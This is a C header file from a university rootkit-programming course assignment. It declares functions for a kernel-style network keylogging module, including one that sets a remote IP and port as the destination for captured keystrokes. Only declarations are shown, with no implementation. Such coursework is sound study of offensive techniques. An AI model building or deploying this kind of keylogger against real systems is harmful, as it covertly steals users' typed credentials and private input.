
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 10                                                            */
/*                                                                             */
/*   Filename: network_keylogging.h                                            */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: January 2016                                                        */
/*                                                                             */
/*   Usage: Header file for module `network_keyloging.c`                       */
/*                                                                             */
/*******************************************************************************/

#ifndef __NETWORK_KEYLOGGING__
#define __NETWORK_KEYLOGGING__


/* Declaration of functions */
int network_keylogging_init(int);
int network_keylogging_exit(void);

void set_remote_dest(char *remote_ip_and_port);
#endif
